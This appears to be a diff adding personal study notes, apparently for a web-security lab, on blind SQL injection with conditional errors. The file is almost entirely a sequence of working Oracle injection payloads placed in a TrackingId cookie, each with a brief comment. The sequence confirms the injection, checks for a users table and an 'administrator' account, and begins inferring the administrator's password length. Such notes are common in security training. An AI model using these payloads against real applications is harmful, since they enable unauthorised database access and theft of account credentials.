@@ -1,0 +1,21 @@
+//blind sql injection with conditional errors
+
+TrackingId =xyz'  (marking the cookie by appending a single character) error message should be received
+
+TrackingId = xyz'' (error escapes hence indicating that a syntax error is having detectable effect
+
+TrackingId=xyz'|| (SELECT '')||' (confirm the server is interpreting this as a sql query)
+
+TrackingId=xyz'|| (SELECT '' FROM dual)||'(this will work for an oracle database)
+
+TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'(since this is an invalid query obviously,an error is returned suggesting our query is been processed)
+
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'(confirm there is a users table and return only one row to avoid breaking)
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' (verify you get an error)
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' (if the error dissapears it suggests you can trigger an error conditionally on the truth of a specific condition)
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'(the error is received confirming we have a user by the name administrator)
+
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'(this should return true since the length of the password is greater than one,increase the number to find out where to stop)
